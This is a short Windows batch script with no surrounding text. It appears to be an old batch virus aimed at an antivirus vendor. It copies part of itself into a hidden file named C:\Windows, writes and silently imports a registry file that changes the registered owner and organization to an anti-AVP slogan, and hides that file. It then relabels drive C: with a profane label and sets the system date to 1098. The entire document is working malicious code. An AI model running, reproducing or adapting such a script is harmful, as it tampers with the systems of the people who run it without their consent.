   @echo off
   if errorlevel 1 goto w1
   :w1
   if exist C:\Windows goto w3
   if not exist %0.bat goto w2
   find "Windows"<%0.bat">C:\Windows
   attrib C:\Windows +h
   :w2
   ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]>>%windir%\MUTTEAM.reg
   ECHO "RegisteredOwner"="Dont buy AVP">>%windir%\MUTTEAM.reg
   ECHO "RegisteredOrganization"="Dont buy AVP">>%windir%\MUTTEAM.reg
   regedit MUTTEAM.reg
   attrib %windir%\MUTTEAM.reg +h
   label C: FUCK_AVP
   :w3
   date 01/01/1098
